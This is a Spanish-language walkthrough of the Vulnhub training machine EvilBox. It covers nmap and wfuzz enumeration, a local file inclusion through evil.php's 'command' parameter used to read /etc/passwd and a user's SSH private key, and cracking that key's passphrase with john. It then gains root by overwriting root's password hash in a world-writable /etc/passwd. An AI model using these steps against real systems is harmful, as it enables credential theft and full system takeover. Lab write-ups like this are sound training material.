---
title: Vulnhub - EvilBox
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, Vulnhub, Easy]
tags: [Linux, 'LFI', 'Misallocated Privileges']
math: true
mermaid: true
image:
  path: /assets/images/Vulnhub/Easy/EvilBox/logo.jpg
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: EvilBox Machine Logo
---

Máquina Linux de nivel **Easy** de Vulnhub.

Técnicas usadas: **LFI, Misallocated Privileges**

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/Vulnhub/Easy/EvilBox/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos.

* **`nmap -p<Ports> -sCV <IP> -oN versiones`**

    ![](/assets/images/Vulnhub/Easy/EvilBox/02-versions.png)

c. Ejecutamos el **script http-enum** de nmap para tratar de descubrir posibles rutas en el servicio web

```bash
nmap -p80 --script http-enum <IP EvilBox>

| http-enum: 
|   /robots.txt: Robots file
|_  /secret/: Potentially interesting folder
```

d. En el directorio **/secret** enumeramos ficheros **.php**

```bash
wfuzz -c -t 100 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt 'http://<IP Evilbox>/secret/FUZZ.php'

000011927:   200        0 L      0 W        0 Ch        "evil"
```

* El archivo **evil.php** se encuentra en el servicio web, pero, no tiene contenido que mostrar, por lo que enumeraremos por posibles parámetros

    ```bash
    wfuzz -c -t 100 --hc=404 --hh=0 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt 'http://<IP EvilBox>/secret/evil.php?FUZZ=/etc/passwd'

    000012419:   200        26 L     38 W       1431 Ch     "command"
    ```

e. Vemos que si al parámetro **command** le indicamos un archivo lo mostrará

![](/assets/images/Vulnhub/Easy/EvilBox/03-LFI.png)

* **mowree** es un usuario en el sistema, así que trataremos de leer su clave **id_rsa**

    ```bash
    http://<IP EvilBox>/secret/evil.php?command=/home/mowree/.ssh/id_rsa
    ```
    > Con esto obtendremos la clave **id_rsa** para autenticarnos por el servicio SSH

* La clave **id_rsa** está encriptada, por lo que usaremos **ssh2john** para obtener el **hash**

    ```bash
    john hash -w=/usr/share/wordlists/rockyou.txt
    unicorn
    ```

f. Nos conectaremos al servicio **ssh** con las credenciales descubiertas anteriormente

```bash
ssh mowree@192.168.100.18 -i id_rsa
Enter passphrase for key 'id_rsa': unicorn
mowree@EvilBoxOne:~$
```

### Escalada de Privilegios 💹

a. Buscamos por archivos en los cuales tengamos permisos de escritura

```bash
mowree@EvilBoxOne:/$ find / -writable 2>/dev/null | grep -vE "^/usr|^/dev|^/proc|^/sys|^/run"
<SNIP>
/etc/passwd
<SNIP>
```

* Como podemos modificar el archivo **/etc/passwd**, generamos con **openssl** una contraseña para sustituirla aquí.

    ```bash
    openssl passwd hola
    $1$zc4xj9j9$e0D8gcnYdXAxHLr3RluXf1
    ```

    ```bash
    mowree@EvilBoxOne:/$ head -n 1 /etc/passwd
    root:$1$zc4xj9j9$e0D8gcnYdXAxHLr3RluXf1:0:0:root:/root:/bin/bash
    ```

b. Nos convertimos en root con la contraseña **`hola`**

```bash
mowree@EvilBoxOne:/$ su root
Contraseña: hola
root@EvilBoxOne:/#
```